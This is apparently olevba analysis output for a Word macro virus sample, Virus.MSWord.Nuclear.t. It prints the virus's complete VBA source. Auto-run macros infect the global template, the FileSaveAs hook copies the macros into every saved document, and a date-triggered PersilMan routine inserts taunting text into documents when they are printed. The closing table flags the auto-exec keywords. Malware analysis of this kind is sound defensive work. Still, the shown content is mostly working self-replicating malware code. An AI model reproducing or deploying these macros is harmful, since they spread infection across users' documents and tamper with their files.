olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nuclear.t-d1a84cb2eed985bee52d02424d4c9f2e0eb0c730
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nuclear.t-d1a84cb2eed985bee52d02424d4c9f2e0eb0c730 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Nuclear.t-d1a84cb2eed985bee52d02424d4c9f2e0eb0c730 - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

On Error GoTo -1: On Error GoTo Busted
If IfNotInstalled = 0 Then
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileOpen", "Global:FileOpen", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PersilMan", "Global:PersilMan", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ClearKepek", "Global:ClearKepek", 0
End If
WordBasic.Call "ClearKepek"
GoTo End_The_Pain:
Busted:
If Err.Number = 509 Then
    Rem do nothing
End If
End_The_Pain:
End Sub

Private Function IfNotInstalled()
Dim i
Dim CheckInstalled
    IfNotInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
            If WordBasic.[MacroName$](i, 0) = "PersilMan" Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nuclear.t-d1a84cb2eed985bee52d02424d4c9f2e0eb0c730 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If IfNotInstalled = 0 Then
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileOpen", "Global:FileOpen", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PersilMan", "Global:PersilMan", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ClearKepek", "Global:ClearKepek", 0
End If
WordBasic.Call "ClearKepek"
End Sub

Private Function IfNotInstalled()
Dim i
Dim CheckInstalled
    IfNotInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
            If WordBasic.[MacroName$](i, 0) = "PersilMan" Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Nuclear.t-d1a84cb2eed985bee52d02424d4c9f2e0eb0c730 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Busted

WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If (dlg.Format = 0) Or (dlg.Format = 1) Then
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec", 0
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 0
    WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 0
    WordBasic.MacroCopy "Global:FilePrint", WordBasic.[WindowName$]() + ":FilePrint", 0
    WordBasic.MacroCopy "Global:FileOpen", WordBasic.[WindowName$]() + ":FileOpen", 0
    WordBasic.MacroCopy "Global:FilePrintDefault", WordBasic.[WindowName$]() + ":FilePrintDefault", 0
    WordBasic.MacroCopy "Global:PersilMan", WordBasic.[WindowName$]() + ":PersilMan", 0
    WordBasic.MacroCopy "Global:ClearKepek", WordBasic.[WindowName$]() + ":ClearKepek", 0
    dlg.Format = 1
End If
WordBasic.FileSaveAs dlg
GoTo EndIt

Busted:
Rem If Err <> 102 Then
Rem     FileSaveAs dlg
Rem EndIf

EndIt:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FilePrint.bas 
in file: Virus.MSWord.Nuclear.t-d1a84cb2eed985bee52d02424d4c9f2e0eb0c730 - OLE stream: 'Macros/VBA/FilePrint'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Prints the active document"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrint.MAIN"
WordBasic.Call "PersilMan"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
WordBasic.CurValues.FilePrint dlg
WordBasic.Dialog.FilePrint dlg
WordBasic.FilePrint dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Nuclear.t-d1a84cb2eed985bee52d02424d4c9f2e0eb0c730 - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO FilePrintDefault.bas 
in file: Virus.MSWord.Nuclear.t-d1a84cb2eed985bee52d02424d4c9f2e0eb0c730 - OLE stream: 'Macros/VBA/FilePrintDefault'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Prints the active document using the current defaults"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrintDefault.MAIN"
WordBasic.Call "PersilMan"
WordBasic.FilePrintDefault
End Sub
-------------------------------------------------------------------------------
VBA MACRO PersilMan.bas 
in file: Virus.MSWord.Nuclear.t-d1a84cb2eed985bee52d02424d4c9f2e0eb0c730 - OLE stream: 'Macros/VBA/PersilMan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If WordBasic.Month(WordBasic.Now()) > 4 And WordBasic.Day(WordBasic.Now()) > 20 Then
    If WordBasic.Second(WordBasic.Now()) > 55 Then
        WordBasic.EndOfDocument
        WordBasic.Insert Chr___() '$11
        WordBasic.Insert "PersilMan will take his revenge"
        WordBasic.Insert Chr___() '$11
        WordBasic.Insert "you will be cleaned up by PersilMan, SOON"
        WordBasic.StartOfDocument
    End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO ClearKepek.bas 
in file: Virus.MSWord.Nuclear.t-d1a84cb2eed985bee52d02424d4c9f2e0eb0c730 - OLE stream: 'Macros/VBA/ClearKepek'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Rem Do kust nothing
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

